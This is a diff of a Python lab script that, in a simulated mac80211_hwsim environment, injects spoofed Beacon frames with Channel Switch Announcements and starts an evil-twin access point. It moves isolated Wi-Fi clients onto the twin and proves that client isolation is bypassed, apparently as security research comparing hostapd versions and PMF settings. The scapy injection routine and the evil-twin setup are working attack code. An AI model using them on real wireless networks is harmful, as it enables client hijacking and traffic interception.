 def inject_beacon_csa(ap_mac, current_ch, evil_ch, iface, count=30, switch_count=1):
-    """
-    Inject spoofed Beacon frames with CSA IE via scapy.
-    Frames are sent from HOST (not inside a namespace).
-    """
+    """wysyla sfalszowane beacony z csa ie przez scapy na interfejsie monitor"""
     from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, conf, sendp
     conf.ifaces.reload()
 
     csa_body = bytes([0x01, evil_ch, switch_count])
     frame = RadioTap() / Dot11(
-        type=0, subtype=8,
+        type=0,
+        subtype=8,
         addr1="ff:ff:ff:ff:ff:ff",
         addr2=ap_mac,
         addr3=ap_mac,
     ) / Dot11Beacon(timestamp=0, beacon_interval=0x0064, cap=0x0431) \
       / Dot11Elt(ID="SSID", info=SSID.encode()) \
-      / Dot11Elt(ID="Rates", info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24') \
+      / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24") \
       / Dot11Elt(ID="DSset", info=bytes([current_ch])) \
       / Dot11Elt(ID=37, info=csa_body)
 
-    log(f"Injecting {count} Beacon CSA frames: ch{current_ch}→ch{evil_ch} "
+    log(f"Injecting {count} Beacon CSA frames: ch{current_ch}->ch{evil_ch} "
         f"(switch_count={switch_count}) via {iface}")
     sendp(frame, iface=iface, count=count, inter=0.1, verbose=False)
     log(f"Injection complete: {count} frames sent")
 
 
-# ─── Main ──────────────────────────────────────────────────────────────────────
+# glowny przeplyw
 def run_attempt(args, attempt_no, max_attempts):
-    global HOSTAPD_PID, WPAS_PID, WMEDIUMD_PID
-    HOSTAPD_PID = None
-    WPAS_PID = None
+    global HOSTAPD_PROCS, WPAS_PROCS, TCPDUMP_PROCS, WMEDIUMD_PID
+    global IFACE_AP, IFACE_INJ, IFACE_CAPTURE, IFACE_EVIL, CLIENTS
+
+    HOSTAPD_PROCS = []
+    WPAS_PROCS = []
+    TCPDUMP_PROCS = []
     WMEDIUMD_PID = None
+    CLIENTS = []
+    attempt_started = time.monotonic()
+    ts_str = datetime.now().strftime("%Y%m%d_%H%M%S")
+    artifacts = []
+    wmediumd_mode = "off"
+    wmediumd_update_result = "SKIPPED"
+    fallback_disconnect_used = False
 
-    log("=" * 50)
-    log("  DIRECT HWSIM CSA INJECTION TEST")
+    log("=" * 58)
+    log("  DIRECT HWSIM EVIL TWIN ISOLATION BYPASS DEMO")
     log(f"  attempt: {attempt_no}/{max_attempts}")
-    log(f"  hostapd: {args.hostapd_ver}  PMF: {args.pmf}")
-    log(f"  Channel: {LEGIT_CHANNEL} → {args.evil_channel}")
-    log("=" * 50)
+    log(f"  hostapd: {args.hostapd_ver}  AP PMF: {args.pmf}  STA PMF: {args.sta_pmf}")
+    log(f"  clients: {args.clients}  radios: {args.radios}")
+    log(f"  Channel: {LEGIT_CHANNEL} -> {args.evil_channel}")
+    if args.wmediumd_loss_after_csa:
+        log("  wmediumd: experimental loss-after-CSA")
+    log("=" * 58)
 
-    # 1. Load hwsim (with pre-cleanup)
     sudo("pkill hostapd 2>/dev/null || true")
     sudo("pkill wpa_supplicant 2>/dev/null || true")
-    time.sleep(0.5)
-    # Clean stale control sockets
+    sudo("pkill tcpdump 2>/dev/null || true")
     sudo("rm -f /var/run/wpa_supplicant/* 2>/dev/null || true")
-    sudo("rm -f /var/run/hostapd/* 2>/dev/null || true")
-    ifaces = load_hwsim(radios=4)
-    if len(ifaces) < 3:
-        log("ERROR: Need at least 3 hwsim radios. Reloading with 4...")
-        ifaces = load_hwsim(radios=4)
-    discover_roles(ifaces)
+    sudo("rm -f /var/run/hostapd/* /var/run/hostapd_evil/* 2>/dev/null || true")
+    time.sleep(0.5)
 
-    # Bring interfaces up
-    for iface in [IFACE_AP, IFACE_STA, IFACE_INJ]:
-        sudo(f"ip link set {iface} up 2>/dev/null || true")
+    ifaces = load_hwsim(radios=args.radios)
+    discover_roles(ifaces, client_count=args.clients)
 
-    # 2. Start wmediumd (channel separation)
+    for iface in [IFACE_AP, IFACE_INJ, IFACE_CAPTURE, IFACE_EVIL]:
+        if iface:
+            sudo(f"ip link set {q(iface)} up 2>/dev/null || true")
+
     if not args.no_wmediumd:
-        start_wmediumd(ifaces)
+        wmediumd_mode = "loss-after-csa" if args.wmediumd_loss_after_csa else "basic"
+        wmediumd_started = start_wmediumd(
+            ifaces,
+            server=args.wmediumd_loss_after_csa,
+            error_prob_model=args.wmediumd_loss_after_csa,
+        )
+        if args.wmediumd_loss_after_csa and not wmediumd_started:
+            wmediumd_update_result = "START_FAIL"
+            cleanup()
+            return save_and_return(
+                args,
+                "WMEDIUMD_START_FAIL",
+                "SKIPPED",
+                artifacts,
+                0,
+                0,
+                None,
+                attempt_started,
+                1,
+                wmediumd_mode=wmediumd_mode,
+                wmediumd_update_result=wmediumd_update_result,
+                fallback_disconnect_used=fallback_disconnect_used,
+            )
 
     try:
-        # 3. Start hostapd (AP)
-        start_hostapd(IFACE_AP, LEGIT_CHANNEL, args.hostapd_ver)
+        setup_client_namespaces(CLIENTS)
 
-        # 4. Start wpa_supplicant (STA)
-        pmf = args.pmf  # Must match between AP and STA
-        start_wpa_supplicant(IFACE_STA, pmf=pmf)
+        start_hostapd(
+            IFACE_AP,
+            LEGIT_CHANNEL,
+            args.hostapd_ver,
+            pmf=args.pmf,
+            ap_isolate=True,
+            name="hostapd_legit",
+            ctrl_dir="/var/run/hostapd",
+        )
 
-        # 5. Wait for real 802.11 association
-        associated, bssid, freq = check_association(IFACE_STA, timeout=30)
+        for client in CLIENTS:
+            start_wpa_supplicant(client, pmf=args.sta_pmf)
+
+        associated, assoc_results, assoc_elapsed = check_all_associated(CLIENTS, timeout=40)
         if not associated:
-            log("FAIL: No association.")
-            for name in ["hostapd.log", "wpa_supplicant.log"]:
+            log("BASELINE_ASSOC_FAIL: not all clients associated with legitimate AP.")
+            for name in ["hostapd_legit.log", *[f"wpa_supplicant_{c.name}.log" for c in CLIENTS]]:
                 lp = TMP_DIR / name
                 if lp.exists():
                     log(f"--- {name} ---")
-                    log(lp.read_text()[:5000])
-            return {"exit_code": 1, "result": "NO_ASSOC"}
+                    log(lp.read_text(errors="replace")[:5000])
+            return {"exit_code": 1, "result": "NO_ASSOC", "attempt_elapsed": time.monotonic() - attempt_started}
 
-        # 6. Pre-attack status
+        assign_client_ips(CLIENTS)
         ap_mac = get_ap_mac(IFACE_AP)
-        pre_channel = get_sta_channel(IFACE_STA)
-        log(f"\n=== PRE-ATTACK STATUS ===")
-        log(f"  AP MAC:     {ap_mac}")
-        log(f"  BSSID:      {bssid}")
-        log(f"  STA channel: {pre_channel}")
-        log(f"  Associated:  YES\n")
+        pre_channels = {client.name: get_sta_channel(client) for client in CLIENTS}
 
-        # 7. Setup Evil Twin BEFORE CSA injection (so it's ready when station switches)
-        evil_result = "SKIPPED"
-        pcap_path = None
-        pcap_tmp = None
-        tcpdump_proc = None
-        evil_proc = None
-        wids_proc = None
-        ts_str = datetime.now().strftime('%Y%m%d_%H%M%S')
-        IFACE_EVIL = ifaces[3] if len(ifaces) >= 4 else None
-        
-        if IFACE_EVIL:
-            sudo(f"ip link set {IFACE_EVIL} up 2>/dev/null || true")
-            log(f"\n=== EVIL TWIN SETUP ===")
-            log(f"  Evil interface: {IFACE_EVIL} on channel {args.evil_channel}")
-            
-            # Start tcpdump on injection interface (monitor mode)
-            # Save to /tmp/ first — VMware share doesn't sync root-owned files reliably
-            pcap_tmp = f"/tmp/handshake_{args.hostapd_ver}_{ts_str}.pcap"
-            pcap_path = RAPORT_DIR / "pcaps" / "csa_injection" / f"evil_twin_{args.hostapd_ver}_{ts_str}.pcap"
-            log(f"  tcpdump → {pcap_tmp}")
-            tcpdump_proc = subprocess.Popen(
-                ["sudo", "tcpdump", "-i", IFACE_INJ, "-w", pcap_tmp,
-                 "-s", "0", "-I", "not", "port", "22"],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        log("\n=== PRE-ATTACK STATUS ===")
+        log(f"  Legit AP MAC: {ap_mac}")
+        for client in CLIENTS:
+            status = assoc_results[client.name]
+            log(f"  {client.name}: BSSID={status['bssid']} freq={status['freq']} channel={pre_channels[client.name]} ip={client.ip_addr}")
+        log("BASELINE_ASSOC_PASS: both clients associated to isolated legitimate AP.")
+
+        if args.demo_isolation:
+            baseline_ok, _, _, baseline_pcap = run_ping_phase(
+                "BASELINE_ISOLATION",
+                CLIENTS[0],
+                CLIENTS[1],
+                expect_success=False,
+                capture_iface=IFACE_AP,
+                ts_str=ts_str,
+                capture_enabled=args.capture_ping,
             )
-            time.sleep(1)
-            
-            # Start Evil Twin AP (PMF=0)
-            evil_conf = TMP_DIR / "hostapd_evil.conf"
-            evil_conf.write_text(f"""interface={IFACE_EVIL}
-driver=nl80211
-ssid={SSID}
-hw_mode=g
-channel={args.evil_channel}
-wpa=2
-wpa_passphrase={PASSPHRASE}
-wpa_key_mgmt=WPA-PSK
-wpa_pairwise=CCMP
-rsn_pairwise=CCMP
-ieee80211w=0
-beacon_int=100
-dtim_period=2
-ctrl_interface=/var/run/hostapd_evil
-ctrl_interface_group=0
-logger_stdout=-1
-logger_stdout_level=2
-""")
-            evil_bin = HOSTAPD_26_BIN if args.hostapd_ver == "2.6" else HOSTAPD_SYS_BIN
-            log(f"  Evil Twin AP starting ({args.hostapd_ver}, SSID={SSID})...")
-            evil_proc = subprocess.Popen(
-                ["sudo", str(evil_bin), str(evil_conf)],
-                stdout=open(str(TMP_DIR / "hostapd_evil.log"), "w"),
-                stderr=subprocess.STDOUT
-            )
-            time.sleep(3)
-            out, _, _ = sudo(f"iw dev {IFACE_EVIL} info")
-            log(f"  Evil Twin: {'READY' if 'type AP' in out else 'FAILED'}")
-        
-        # 8. Setup injection interface
-        setup_monitor_mode(IFACE_INJ, LEGIT_CHANNEL)
+            if baseline_pcap:
+                artifacts.append(baseline_pcap)
+            if not baseline_ok:
+                result = "BASELINE_ISOLATION_FAIL"
+                return_result = 1
+                return save_and_return(args, result, "SKIPPED", artifacts, assoc_elapsed, 0, None, attempt_started, return_result)
+        else:
+            log("BASELINE_ISOLATION_SKIPPED: --demo-isolation disabled.")
 
-        # 9. Stop tcpdump before injection to avoid frame collision on same iface
-        if IFACE_EVIL and tcpdump_proc:
-            tcpdump_proc.terminate()
-            try:
-                tcpdump_proc.wait(timeout=3)
-            except subprocess.TimeoutExpired:
-                tcpdump_proc.kill()
-            log("  tcpdump paused for CSA injection")
+        if not IFACE_EVIL:
+            result = "NO_EVIL_IFACE"
+            return save_and_return(args, result, "SKIPPED", artifacts, assoc_elapsed, 0, None, attempt_started, 1)
 
-        # Inject Beacon CSA (Evil Twin already waiting on evil channel)
-        inject_beacon_csa(
-            ap_mac, LEGIT_CHANNEL, args.evil_channel,
-            IFACE_INJ, count=args.beacon_count, switch_count=1
+        sudo(f"ip link set {q(IFACE_EVIL)} up 2>/dev/null || true")
+        log("\n=== EVIL TWIN SETUP ===")
+        evil_proc = start_hostapd(
+            IFACE_EVIL,
+            args.evil_channel,
+            args.hostapd_ver,
+            pmf=args.evil_pmf,
+            ap_isolate=False,
+            name="hostapd_evil",
+            ctrl_dir="/var/run/hostapd_evil",
         )
+        evil_mac = get_ap_mac(IFACE_EVIL)
+        log(f"Evil Twin MAC: {evil_mac}")
 
-        # Restart tcpdump after injection
-        if IFACE_EVIL:
-            tcpdump_proc = subprocess.Popen(
-                ["sudo", "tcpdump", "-i", IFACE_INJ, "-w", pcap_tmp,
-                 "-s", "0", "-I", "not", "port", "22"],
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        setup_monitor_mode(IFACE_INJ, LEGIT_CHANNEL)
+        if IFACE_CAPTURE:
+            setup_monitor_mode(IFACE_CAPTURE, LEGIT_CHANNEL)
+            csa_capture_iface = IFACE_CAPTURE
+        else:
+            csa_capture_iface = None
+            log("CSA monitor PCAP disabled because no separate capture radio is available.")
+
+        csa_tmp = f"/tmp/csa_reassoc_{args.hostapd_ver}_{ts_str}.pcap"
+        csa_final = PCAP_DIR / f"csa_reassoc_{args.hostapd_ver}_{ts_str}.pcap"
+        csa_proc = start_tcpdump("CSA_REASSOC", csa_capture_iface, csa_tmp, monitor=True, bpf="not port 22") if csa_capture_iface else None
+
+        csa_started = time.monotonic()
+        burst_count = 0
+        switch_elapsed = None
+        switched = False
+        post_channels = pre_channels.copy()
+
+        for burst_no in range(1, args.csa_bursts + 1):
+            burst_count = burst_no
+            log(f"  CSA burst {burst_no}/{args.csa_bursts}")
+            inject_beacon_csa(
+                ap_mac,
+                LEGIT_CHANNEL,
+                args.evil_channel,
+                IFACE_INJ,
+                count=args.beacon_count,
+                switch_count=1,
             )
-            time.sleep(1)
+            log(f"Waiting up to {args.wait}s for both clients to switch channel...")
+            switched, post_channels, poll_elapsed = wait_for_clients_channel(
+                CLIENTS,
+                args.evil_channel,
+                timeout=args.wait,
+                poll_interval=args.poll_interval,
+            )
+            if switched:
+                switch_elapsed = time.monotonic() - csa_started
+                log(f"CSA_SWITCH_PASS: both clients switched after {switch_elapsed:.1f}s "
+                    f"(burst {burst_no}, poll {poll_elapsed:.1f}s)")
+                break
+            if burst_no < args.csa_bursts:
+                log("No full channel switch yet; sending another CSA burst...")
+                time.sleep(args.burst_gap)
 
-        # 10. Wait for channel switch + check channel BEFORE disconnect
-        log(f"Waiting {args.wait}s for channel switch...")
-        time.sleep(args.wait)
+        if IFACE_CAPTURE:
+            sudo(f"iw dev {q(IFACE_CAPTURE)} set channel {int(args.evil_channel)} 2>/dev/null || true")
 
-        # Check channel BEFORE force-disconnect (disconnect kills the read)
-        post_channel = get_sta_channel(IFACE_STA)
-        log(f"  Post-CSA channel: {post_channel}")
+        if not switched:
+            log(f"CSA_SWITCH_FAIL: channels after CSA: {post_channels}")
+            stop_tcpdump(csa_proc, "CSA_REASSOC")
+            csa_pcap = copy_pcap(csa_tmp, csa_final) if csa_proc else None
+            if csa_pcap:
+                artifacts.append(csa_pcap)
+            result = "WMEDIUMD_INJECTION_BLOCKED" if args.wmediumd_loss_after_csa else "CSA_SWITCH_FAIL"
+            if args.wmediumd_loss_after_csa:
+                log("WMEDIUMD_INJECTION_BLOCKED: wmediumd is active and clients did not process Beacon CSA.")
+            return save_and_return(
+                args,
+                result,
+                "SKIPPED",
+                artifacts,
+                assoc_elapsed,
+                burst_count,
+                switch_elapsed,
+                attempt_started,
+                1,
+                wmediumd_mode=wmediumd_mode,
+                wmediumd_update_result=wmediumd_update_result,
+                fallback_disconnect_used=fallback_disconnect_used,
+            )
 
-        # 10a. Simulate physical channel isolation
-        # In real WiFi, switching channel physically disconnects from old AP.
-        # hwsim shares one virtual medium — force disconnect to simulate this.
-        if IFACE_EVIL and post_channel == args.evil_channel:
-            sudo(f"iw dev {IFACE_STA} disconnect 2>/dev/null || true")
-            log("  Force-disconnect STA (simulating physical channel isolation)")
+        if args.wmediumd_loss_after_csa:
+            log("Experimental wmediumd-loss: cutting legit AP <-> STA links after CSA.")
+            update_ok, update_detail = apply_wmediumd_loss_after_csa(ap_mac, CLIENTS)
+            wmediumd_update_result = update_detail
+            if update_ok:
+                log(f"WMEDIUMD_LOSS_APPLIED: {update_detail}")
+            else:
+                log(f"WMEDIUMD_UPDATE_FAIL: {update_detail}")
+                return save_and_return(
+                    args,
+                    "WMEDIUMD_UPDATE_FAIL",
+                    "SKIPPED",
+                    artifacts,
+                    assoc_elapsed,
+                    burst_count,
+                    switch_elapsed,
+                    attempt_started,
+                    1,
+                    wmediumd_mode=wmediumd_mode,
+                    wmediumd_update_result=wmediumd_update_result,
+                    fallback_disconnect_used=fallback_disconnect_used,
+                )
+        else:
+            log("Force-disconnect clients to model physical channel separation after CSA.")
+            for client in CLIENTS:
+                client_cmd(client, f"iw dev {q(client.iface)} disconnect 2>/dev/null || true")
             time.sleep(2)
 
-        # Post-attack status
-        post_associated, _, post_freq = check_association(IFACE_STA, timeout=3)
+        log("\n=== POST-CSA MONITORING ===")
+        log("Waiting for both clients to reassociate to Evil Twin...")
+        evil_associated, evil_assoc_results, evil_assoc_elapsed = check_all_associated(
+            CLIENTS,
+            timeout=args.evil_wait,
+            expected_bssid=evil_mac,
+        )
 
-        log(f"\n=== POST-ATTACK STATUS ===")
-        log(f"  STA channel:    {post_channel}")
-        log(f"  Associated:     {post_associated}")
-        log(f"  Frequency:      {post_freq}")
+        stop_tcpdump(csa_proc, "CSA_REASSOC")
+        csa_pcap = copy_pcap(csa_tmp, csa_final) if csa_proc else None
+        if csa_pcap:
+            artifacts.append(csa_pcap)
 
-        # Analysis
-        log(f"\n=== ANALYSIS ===")
-        if post_channel == args.evil_channel:
-            log(f"🎯 SUCCESS: Station switched to evil channel {post_channel}!")
-            log(f"   Beacon CSA bypassed PMF on hostapd {args.hostapd_ver}")
-            result = "SUCCESS"
-        elif post_channel == pre_channel:
-            log(f"🛡️ BLOCKED: Station stayed on channel {post_channel}")
-            log(f"   PMF on hostapd {args.hostapd_ver} blocked Beacon CSA")
-            result = "BLOCKED"
+        if evil_associated:
+            evil_result = "EVIL_TWIN_REASSOC_PASS"
+            log("EVIL_TWIN_REASSOC_PASS: both clients reassociated to Evil Twin.")
         else:
-            log(f"❓ ANOMALY: Unexpected channel {post_channel}")
-            result = "ANOMALY"
-
-        # 11. Post-CSA monitoring — wait for station to reassociate to Evil Twin
-        if IFACE_EVIL and post_channel == args.evil_channel:
-            log(f"\n=== POST-CSA MONITORING ===")
-            log(f"  Waiting 25s for station reassociation to Evil Twin...")
-            evil_wait = 25
-            deadline = time.time() + evil_wait
-            evil_associated = False
-            was_disconnected = False
-            while time.time() < deadline:
-                sta_out, _, _ = sudo(f"iw dev {IFACE_STA} link")
-                if "Not connected" in sta_out:
-                    was_disconnected = True
-                if "Connected to" in sta_out and was_disconnected:
-                    evil_associated = True
-                    bssid = sta_out.split("Connected to")[-1].strip().split()[0]
-                    log(f"  🔑 REASSOCIATED! BSSID={bssid}")
-                    break
+            if args.wmediumd_loss_after_csa and args.wmediumd_fallback_disconnect:
+                log("wmediumd-loss did not trigger roam; applying explicit fallback disconnect.")
+                for client in CLIENTS:
+                    client_cmd(client, f"iw dev {q(client.iface)} disconnect 2>/dev/null || true")
+                fallback_disconnect_used = True
                 time.sleep(2)
-            
-            if evil_associated:
-                log(f"  Handshake captured!")
-                evil_result = "EVIL_TWIN_SUCCESS"
-            elif was_disconnected:
-                log(f"  Station disconnected but didn't reconnect to Evil Twin")
-                evil_result = "EVIL_TWIN_NO_RECONNECT"
+                evil_associated, evil_assoc_results, evil_assoc_elapsed = check_all_associated(
+                    CLIENTS,
+                    timeout=args.evil_wait,
+                    expected_bssid=evil_mac,
+                )
+                if evil_associated:
+                    evil_result = "EVIL_TWIN_REASSOC_PASS"
+                    log("EVIL_TWIN_REASSOC_PASS: fallback disconnect moved clients to Evil Twin.")
+
+        if not evil_associated:
+            evil_result = "EVIL_TWIN_REASSOC_FAIL"
+            if args.wmediumd_loss_after_csa:
+                log("WMEDIUMD_LOSS_NO_ROAM: link loss applied, but clients did not reassociate automatically.")
+                result = "WMEDIUMD_LOSS_NO_ROAM"
             else:
-                log(f"  Station never disconnected")
-                evil_result = "EVIL_TWIN_NO_DISCONNECT"
-            
-            # Stop tcpdump and copy PCAP to share
-            stop_process(tcpdump_proc, "tcpdump")
-            # Copy from /tmp/ to VMware share
-            pcap_path.parent.mkdir(parents=True, exist_ok=True)
-            if pcap_tmp and os.path.exists(pcap_tmp) and os.path.getsize(pcap_tmp) > 24:
-                subprocess.run(["sudo", "cp", pcap_tmp, str(pcap_path)], capture_output=True)
-                log(f"  PCAP: {pcap_path} ({os.path.getsize(pcap_tmp)} bytes)")
-            else:
-                log(f"  PCAP: empty/missing (tcpdump on injection iface may have captured nothing)")
-            
-        elif not IFACE_EVIL:
-            log(f"\n=== EVIL TWIN SKIPPED (need 4 radios, got {len(ifaces)}) ===")
+                log("EVIL_TWIN_REASSOC_FAIL: not all clients reached Evil Twin.")
+                result = "EVIL_TWIN_REASSOC_FAIL"
+            for client in CLIENTS:
+                status = evil_assoc_results[client.name]
+                log(f"  {client.name}: associated={status['associated']} bssid={status['bssid']} freq={status['freq']}")
+            return save_and_return(
+                args,
+                result,
+                evil_result,
+                artifacts,
+                assoc_elapsed,
+                burst_count,
+                switch_elapsed,
+                attempt_started,
+                1,
+                wmediumd_mode=wmediumd_mode,
+                wmediumd_update_result=wmediumd_update_result,
+                fallback_disconnect_used=fallback_disconnect_used,
+            )
+
+        assign_client_ips(CLIENTS)
+        evil_ping_ok, _, _, evil_ping_pcap = run_ping_phase(
+            "EVIL_TWIN_PING",
+            CLIENTS[0],
+            CLIENTS[1],
+            expect_success=True,
+            capture_iface=IFACE_EVIL,
+            ts_str=ts_str,
+            capture_enabled=args.capture_ping,
+        )
+        if evil_ping_pcap:
+            artifacts.append(evil_ping_pcap)
+
+        if evil_ping_ok:
+            result = "SUCCESS"
+            log("SUCCESS: isolation bypass shown. Clients cannot ping on legit AP, then can ping on Evil Twin.")
+            exit_code = 0
         else:
-            log(f"\n=== EVIL TWIN SKIPPED (CSA didn't switch channel) ===")
+            result = "EVIL_TWIN_PING_FAIL"
+            log("EVIL_TWIN_PING_FAIL: clients reached Evil Twin but ping proof failed.")
+            exit_code = 1
 
-        # These children are started before CSA. Stop them on every outcome,
-        # especially BLOCKED/ANOMALY, or SSH demos can hang after the log line.
-        stop_process(tcpdump_proc, "tcpdump")
-        stop_process(wids_proc, "WIDS sniffer")
+        log(f"Evil reassociation seconds: {evil_assoc_elapsed:.1f}")
         stop_process(evil_proc, "Evil Twin hostapd")
-
-        # Save log
-        log_path = RAPORT_DIR / "logs" / f"direct_csa_{args.hostapd_ver}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-        log_path.parent.mkdir(parents=True, exist_ok=True)
-        with open(log_path, "w") as f:
-            f.write(f"Test: Direct hwsim CSA Injection\n")
-            f.write(f"hostapd: {args.hostapd_ver}\n")
-            f.write(f"PMF: {args.pmf}\n")
-            f.write(f"Legit channel: {LEGIT_CHANNEL}\n")
-            f.write(f"Evil channel: {args.evil_channel}\n")
-            f.write(f"Beacon count: {args.beacon_count}\n")
-            f.write(f"Result: {result}\n")
-            f.write(f"Pre channel: {pre_channel} → Post channel: {post_channel}\n")
-            f.write(f"Associated after: {post_associated}\n")
-            f.write(f"Evil Twin: {evil_result}\n")
-            if pcap_path:
-                f.write(f"PCAP: {pcap_path}\n")
-        log(f"Log saved: {log_path}")
-
-        return {
-            "exit_code": 0 if result == "SUCCESS" else 1,
-            "result": result,
-            "log_path": str(log_path),
-            "pre_channel": pre_channel,
-            "post_channel": post_channel,
-            "evil_result": evil_result,
-        }
+        return save_and_return(
+            args,
+            result,
+            evil_result,
+            artifacts,
+            assoc_elapsed,
+            burst_count,
+            switch_elapsed,
+            attempt_started,
+            exit_code,
+            wmediumd_mode=wmediumd_mode,
+            wmediumd_update_result=wmediumd_update_result,
+            fallback_disconnect_used=fallback_disconnect_used,
+        )
 
     except Exception as e:
         log(f"ERROR: {e}")
         import traceback
         traceback.print_exc()
-        return {"exit_code": 2, "result": "ERROR"}
+        return {"exit_code": 2, "result": "ERROR", "attempt_elapsed": time.monotonic() - attempt_started}
     finally:
         cleanup()
 
 
-def main():
+def save_and_return(
+    args,
+    result,
+    evil_result,
+    artifacts,
+    assoc_elapsed,
+    burst_count,
+    switch_elapsed,
+    attempt_started,
+    exit_code,
+    wmediumd_mode="off",
+    wmediumd_update_result="SKIPPED",
+    fallback_disconnect_used=False,
+):
+    LOG_DIR.mkdir(parents=True, exist_ok=True)
+    log_path = LOG_DIR / f"direct_csa_{args.hostapd_ver}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    with open(log_path, "w") as f:
+        f.write("Test: Direct hwsim Evil Twin Isolation Bypass\n")
+        f.write(f"hostapd: {args.hostapd_ver}\n")
+        f.write(f"Legit AP PMF: {args.pmf}\n")
+        f.write(f"STA PMF: {args.sta_pmf}\n")
+        f.write(f"Evil AP PMF: {args.evil_pmf}\n")
+        f.write(f"Clients: {args.clients}\n")
+        f.write(f"Radios: {args.radios}\n")
+        f.write(f"Demo isolation: {args.demo_isolation}\n")
+        f.write(f"Capture ping: {args.capture_ping}\n")
+        f.write(f"Wmediumd mode: {wmediumd_mode}\n")
+        f.write(f"Wmediumd update result: {wmediumd_update_result}\n")
+        f.write(f"Fallback disconnect used: {fallback_disconnect_used}\n")
+        f.write(f"Legit channel: {LEGIT_CHANNEL}\n")
+        f.write(f"Evil channel: {args.evil_channel}\n")
+        f.write(f"Beacon count: {args.beacon_count}\n")
+        f.write(f"Result: {result}\n")
+        f.write(f"Evil Twin: {evil_result}\n")
+        f.write(f"Association seconds: {assoc_elapsed:.1f}\n")
+        f.write(f"CSA bursts used: {burst_count}\n")
+        if switch_elapsed is None:
+            f.write("Switch seconds: NONE\n")
+        else:
+            f.write(f"Switch seconds: {switch_elapsed:.1f}\n")
+        f.write(f"Attempt seconds: {time.monotonic() - attempt_started:.1f}\n")
+        for artifact in artifacts:
+            f.write(f"PCAP: {artifact}\n")
+    log(f"Log saved: {log_path}")
+    return {
+        "exit_code": exit_code,
+        "result": result,
+        "log_path": str(log_path),
+        "evil_result": evil_result,
+        "artifacts": artifacts,
+        "burst_count": burst_count,
+        "switch_elapsed": switch_elapsed,
+        "assoc_elapsed": assoc_elapsed,
+        "wmediumd_mode": wmediumd_mode,
+        "wmediumd_update_result": wmediumd_update_result,
+        "fallback_disconnect_used": fallback_disconnect_used,
+        "attempt_elapsed": time.monotonic() - attempt_started,
+    }
+
+
+def parse_args():
     parser = argparse.ArgumentParser(
-        description="Direct hwsim CSA Injection Test (no Mininet-WiFi)"
+        description="Direct hwsim Evil Twin client-isolation bypass demo (no Mininet-WiFi)"
     )
     parser.add_argument("--hostapd-ver", default="2.10", choices=["2.6", "2.10"],
                         help="hostapd version (default: 2.10)")
     parser.add_argument("--evil-channel", type=int, default=EVIL_CHANNEL,
                         help=f"Target channel for CSA (default: {EVIL_CHANNEL})")
     parser.add_argument("--beacon-count", type=int, default=30,
-                        help="Number of Beacon CSA frames to inject")
+                        help="Number of Beacon CSA frames to inject per burst")
     parser.add_argument("--no-wmediumd", action="store_true",
-                        help="Skip wmediumd (channels not separated)")
+                        help="Skip wmediumd (default wrapper does this for hwsim stability)")
+    parser.add_argument("--wmediumd-loss-after-csa", action="store_true",
+                        help="Experimental: use wmediumd server errprob updates instead of force-disconnect after CSA")
+    parser.add_argument("--wmediumd-fallback-disconnect", action="store_true",
+                        help="With --wmediumd-loss-after-csa, fall back to explicit disconnect if clients do not roam")
     parser.add_argument("--pmf", type=int, default=2, choices=[0, 1, 2],
-                        help="PMF mode: 0=disabled, 1=optional, 2=required")
+                        help="Legitimate AP PMF mode: 0=disabled, 1=optional, 2=required")
+    parser.add_argument("--sta-pmf", type=int, default=1, choices=[0, 1, 2],
+                        help="Client PMF mode. Default 1 supports PMF on legit AP but can join PMF-off Evil Twin.")
+    parser.add_argument("--evil-pmf", type=int, default=0, choices=[0, 1, 2],
+                        help="Evil Twin PMF mode (default: 0)")
     parser.add_argument("--wait", type=int, default=15,
-                        help="Seconds to wait after CSA for channel switch")
+                        help="Seconds to poll after each CSA burst for channel switch")
+    parser.add_argument("--evil-wait", type=int, default=30,
+                        help="Seconds to wait for Evil Twin reassociation")
     parser.add_argument("--retries", type=int, default=2,
                         help="Retry timing-sensitive failed/BLOCKED runs (default: 2)")
-    args = parser.parse_args()
+    parser.add_argument("--until-success", action="store_true",
+                        help="Retry attempts until SUCCESS or Ctrl+C")
+    parser.add_argument("--csa-bursts", type=int, default=3,
+                        help="CSA burst rounds per attempt before marking blocked")
+    parser.add_argument("--poll-interval", type=float, default=1.0,
+                        help="Seconds between channel polls during CSA wait")
+    parser.add_argument("--burst-gap", type=float, default=1.0,
+                        help="Seconds to wait between CSA bursts")
+    parser.add_argument("--clients", type=int, default=2,
+                        help="Number of client stations to create (default: 2)")
+    parser.add_argument("--radios", type=int, default=6,
+                        help="Number of hwsim radios to load (default: 6; use >= clients+4 for separate capture radio)")
+    parser.add_argument("--demo-isolation", dest="demo_isolation", action="store_true", default=True,
+                        help="Run baseline client-isolation ping proof before CSA (default: enabled)")
+    parser.add_argument("--no-demo-isolation", dest="demo_isolation", action="store_false",
+                        help="Skip baseline client-isolation ping proof")
+    parser.add_argument("--capture-ping", dest="capture_ping", action="store_true", default=True,
+                        help="Capture baseline and Evil Twin ping traffic with tcpdump (default: enabled)")
+    parser.add_argument("--no-capture-ping", dest="capture_ping", action="store_false",
+                        help="Run ping proofs without ping PCAP capture")
+    return parser.parse_args()
 
-    max_attempts = max(1, args.retries + 1)
+
+def main():
+    args = parse_args()
+    if args.wmediumd_loss_after_csa and args.no_wmediumd:
+        log("wmediumd-loss-after-csa requested; enabling wmediumd despite --no-wmediumd.")
+        args.no_wmediumd = False
+    if args.clients < 2:
+        log("ERROR: this demo needs at least two clients for ping proof. Use --clients 2.")
+        return 2
+    min_radios = args.clients + 3
+    if args.radios < min_radios:
+        log(f"ERROR: --radios must be at least {min_radios} for {args.clients} clients.")
+        return 2
+
+    max_attempts = "infinity" if args.until_success else max(1, args.retries + 1)
     final = None
-    for attempt_no in range(1, max_attempts + 1):
-        final = run_attempt(args, attempt_no, max_attempts)
-        if final["result"] == "SUCCESS":
-            return 0
+    attempt_no = 1
+    try:
+        while True:
+            final = run_attempt(args, attempt_no, max_attempts)
+            if final["result"] == "SUCCESS":
+                return 0
 
-        if attempt_no < max_attempts and final["result"] in {"BLOCKED", "ANOMALY", "NO_ASSOC", "ERROR"}:
-            log(f"Retrying scenario after {final['result']} (timing issue likely)...")
-            time.sleep(2)
-            continue
-
